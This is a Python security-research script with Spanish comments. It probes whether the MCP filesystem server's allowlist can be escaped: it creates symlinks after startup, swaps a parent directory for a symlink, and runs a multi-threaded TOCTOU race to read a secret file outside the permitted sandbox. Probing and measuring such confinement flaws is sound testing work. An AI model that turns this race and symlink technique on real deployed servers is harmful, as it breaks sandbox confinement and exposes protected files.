"""VARIANTE del arnes bench/scripts/mcp_probe_bin.py.

Se copia aqui (y NO se modifica el original) porque el arnes oficial ejecuta
los pasos EN SERIE y no permite mutar el sistema de ficheros ENTRE la
validacion y la lectura. Ambas cosas hacen falta para:

  Fase A (vector 4 del encargo): enlace hacia fuera creado DESPUES de que el
          servidor haya arrancado y resuelto su allowlist.
  Fase C: travesia por enlace de directorio PADRE
          (servers/src/filesystem/__tests__/path-validation.test.ts:784).
  Fase B: la condicion de carrera TOCTOU que el propio repo documenta en
          __tests__/path-validation.test.ts:932
          ('demonstrates race condition in read operations').
  Fase B2: la misma carrera con la ventana ENSANCHADA artificialmente
          (UV_THREADPOOL_SIZE=1 + muchas llamadas en vuelo), para separar
          "no existe la carrera" de "no la gano en esta maquina".

Los enlaces se crean con os.symlink (requiere Modo Desarrollador de Windows,
que en esta maquina esta activo: HKLM\\...\\AppModelUnlock
AllowDevelopmentWithoutDevLicense = 1). No se usa mklink por cmd porque el
paso de argumentos por cmd /c destroza las rutas con comillas.

Uso: python toctou_probe.py <salida.json> [fases]
     fases: A,C,B,B2  (por defecto todas)
"""
import asyncio
import json
import os
import shutil
import sys
import threading
import time

from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client

BASE = r"D:\Work\research\FileX\bench\salidas-mcp-refs\confinamiento"
PERM = BASE + r"\sandbox\permitido"
PROH = BASE + r"\sandbox\prohibido"
SECRETO = PROH + r"\secreto.txt"
MARCA = "SECRETO_PROHIBIDO_ABCDEF"

N_RONDAS = 1500
N_CONCURRENTES = 16
N_RONDAS_B2 = 300
N_CONCURRENTES_B2 = 96


def borrar(p):
    try:
        if os.path.islink(p) or os.path.isfile(p):
            os.remove(p)
            return
    except OSError:
        pass
    try:
        os.rmdir(p)          # enlace de directorio o directorio vacio
        return
    except OSError:
        pass
    try:
        shutil.rmtree(p)
    except OSError:
        pass


def texto(res):
    out = []
    for c in getattr(res, "content", []) or []:
        t = getattr(c, "text", None)
        if t:
            out.append(t)
    return "\n".join(out)


async def llamar(session, tool, args):
    t0 = time.perf_counter()
    try:
        r = await session.call_tool(tool, args)
        return {"ok": True, "isError": bool(getattr(r, "isError", False)),
                "texto": texto(r), "ms": round((time.perf_counter() - t0) * 1000, 2)}
    except Exception as e:
        return {"ok": False, "isError": None,
                "texto": "%s: %s" % (type(e).__name__, e),
                "ms": round((time.perf_counter() - t0) * 1000, 2)}


def params_servidor(extra_env=None):
    env = os.environ.copy()
    if extra_env:
        env.update(extra_env)
    return StdioServerParameters(
        command="npx.cmd",
        args=["-y", "@modelcontextprotocol/server-filesystem", PERM],
        cwd=BASE, env=env)


async def fase_A_C(reg):
    for p in (PERM + r"\link_post.txt", PERM + r"\dlink_post",
              PERM + r"\d1", PERM + r"\race.txt"):
        borrar(p)
    os.makedirs(PERM + r"\d1", exist_ok=True)
    with open(PERM + r"\d1\f.txt", "w") as f:
        f.write("FICHERO REGULAR EN d1\n")
    with open(PERM + r"\race.txt", "w") as f:
        f.write("FICHERO REGULAR BENIGNO\n")

    errlog = open(BASE + r"\logs\toctou_AC.stderr.log", "w",
                  encoding="utf-8", errors="replace")
    async with stdio_client(params_servidor(), errlog=errlog) as (r_, w_):
        async with ClientSession(r_, w_) as s:
            await s.initialize()

            fa = {"descripcion": "enlace hacia fuera creado DESPUES del arranque"}
            fa["control_antes"] = await llamar(s, "read_text_file",
                                               {"path": PERM + r"\race.txt"})
            os.symlink(SECRETO, PERM + r"\link_post.txt")
            fa["enlace_fichero_creado"] = os.path.islink(PERM + r"\link_post.txt")
            fa["lectura_enlace_fichero"] = await llamar(
                s, "read_text_file", {"path": PERM + r"\link_post.txt"})
            fa["fugo_el_secreto"] = MARCA in fa["lectura_enlace_fichero"]["texto"]

            os.symlink(PROH, PERM + r"\dlink_post", target_is_directory=True)
            fa["enlace_directorio_creado"] = os.path.isdir(PERM + r"\dlink_post")
            fa["lectura_por_enlace_directorio"] = await llamar(
                s, "read_text_file", {"path": PERM + r"\dlink_post\secreto.txt"})
            fa["fugo_por_directorio"] = MARCA in fa["lectura_por_enlace_directorio"]["texto"]
            fa["listado_de_la_raiz"] = await llamar(s, "list_directory", {"path": PERM})
            reg["fases"]["A_post_arranque"] = fa

            fc = {"descripcion": "el directorio padre d1 se sustituye por un "
                                 "enlace a prohibido DESPUES de una lectura valida"}
            fc["control_antes"] = await llamar(s, "read_text_file",
                                               {"path": PERM + r"\d1\f.txt"})
            borrar(PERM + r"\d1")
            os.symlink(PROH, PERM + r"\d1", target_is_directory=True)
            fc["enlace_creado"] = os.path.isdir(PERM + r"\d1")
            fc["lectura_tras_swap"] = await llamar(
                s, "read_text_file", {"path": PERM + r"\d1\secreto.txt"})
            fc["fugo_el_secreto"] = MARCA in fc["lectura_tras_swap"]["texto"]
            # y la ruta ORIGINAL, que el servidor ya habia validado antes
            fc["lectura_ruta_ya_validada"] = await llamar(
                s, "read_text_file", {"path": PERM + r"\d1\f.txt"})
            reg["fases"]["C_padre_enlazado"] = fc
    errlog.close()
    for p in (PERM + r"\link_post.txt", PERM + r"\dlink_post", PERM + r"\d1"):
        borrar(p)


async def carrera(reg, clave, extra_env, rondas, concurrentes, nota):
    ruta = PERM + r"\race.txt"
    borrar(ruta)
    with open(ruta, "w") as f:
        f.write("FICHERO REGULAR BENIGNO\n")

    parar = threading.Event()
    cnt = {"swaps": 0, "err_symlink": 0, "err_write": 0, "ultimo": ""}

    def intercambiador():
        while not parar.is_set():
            try:
                os.remove(ruta)
            except OSError:
                pass
            try:
                os.symlink(SECRETO, ruta)
            except OSError as e:
                cnt["err_symlink"] += 1
                cnt["ultimo"] = "symlink: %s" % e
            try:
                os.remove(ruta)
            except OSError:
                pass
            try:
                with open(ruta, "w") as f:
                    f.write("FICHERO REGULAR BENIGNO\n")
            except OSError as e:
                cnt["err_write"] += 1
                cnt["ultimo"] = "write: %s" % e
            cnt["swaps"] += 1

    errlog = open(BASE + r"\logs\toctou_%s.stderr.log" % clave, "w",
                  encoding="utf-8", errors="replace")
    fugas, deneg, oks, enoent, otros, vacias = [], 0, 0, 0, 0, 0
    muestras = []
    total = 0
    async with stdio_client(params_servidor(extra_env), errlog=errlog) as (r_, w_):
        async with ClientSession(r_, w_) as s:
            await s.initialize()
            hilos = [threading.Thread(target=intercambiador, daemon=True)
                     for _ in range(3)]
            for h in hilos:
                h.start()
            t0 = time.perf_counter()
            for _ in range(rondas):
                res = await asyncio.gather(*[
                    llamar(s, "read_text_file", {"path": ruta})
                    for _ in range(concurrentes)])
                for x in res:
                    total += 1
                    t = x["texto"]
                    if MARCA in t:
                        fugas.append(t[:250])
                    elif "Access denied" in t:
                        deneg += 1
                    elif "ENOENT" in t:
                        enoent += 1
                    elif "BENIGNO" in t:
                        oks += 1
                    elif t.strip() == "":
                        vacias += 1
                    else:
                        otros += 1
                        if len(muestras) < 6:
                            muestras.append(t[:200])
                if fugas:
                    break
            dur = time.perf_counter() - t0
            parar.set()
            for h in hilos:
                h.join(timeout=5)
    errlog.close()
    borrar(ruta)
    reg["fases"][clave] = {
        "descripcion": nota,
        "env_extra": extra_env or {},
        "n_llamadas": total, "concurrentes_por_ronda": concurrentes,
        "segundos": round(dur, 2), "swaps": cnt["swaps"],
        "err_symlink": cnt["err_symlink"], "err_write": cnt["err_write"],
        "ultimo_error_intercambiador": cnt["ultimo"],
        "lecturas_benignas": oks, "denegadas_por_symlink": deneg,
        "enoent": enoent, "respuestas_vacias": vacias, "otros": otros,
        "muestras_otros": muestras,
        "n_fugas": len(fugas), "TOCTOU_REPRODUCIDO": bool(fugas),
        "muestras_de_fuga": fugas[:5],
    }
    print(clave, "->", json.dumps(reg["fases"][clave], ensure_ascii=False)[:900])


async def main(out_path, fases):
    reg = {"servidor": "@modelcontextprotocol/server-filesystem 2026.7.10 (npx)",
           "raiz_permitida": PERM, "fases": {}}
    if "A" in fases or "C" in fases:
        await fase_A_C(reg)
    if "B" in fases:
        await carrera(reg, "B_carrera_normal", None, N_RONDAS, N_CONCURRENTES,
                      "read_text_file en bucle mientras 3 hilos alternan race.txt "
                      "entre fichero regular y enlace al secreto. Servidor con "
                      "configuracion por defecto.")
    if "B2" in fases:
        await carrera(reg, "B2_carrera_ventana_ensanchada",
                      {"UV_THREADPOOL_SIZE": "1"}, N_RONDAS_B2, N_CONCURRENTES_B2,
                      "Misma carrera con UV_THREADPOOL_SIZE=1 y 96 llamadas en "
                      "vuelo: la cola del pool de hilos de libuv separa el "
                      "realpath() de validatePath del readFile() posterior, "
                      "ensanchando la ventana artificialmente.")
    with open(out_path, "w", encoding="utf-8") as f:
        json.dump(reg, f, ensure_ascii=False, indent=2)
    print("escrito", out_path)


if __name__ == "__main__":
    f = sys.argv[2].split(",") if len(sys.argv) > 2 else ["A", "C", "B", "B2"]
    asyncio.run(main(sys.argv[1], f))
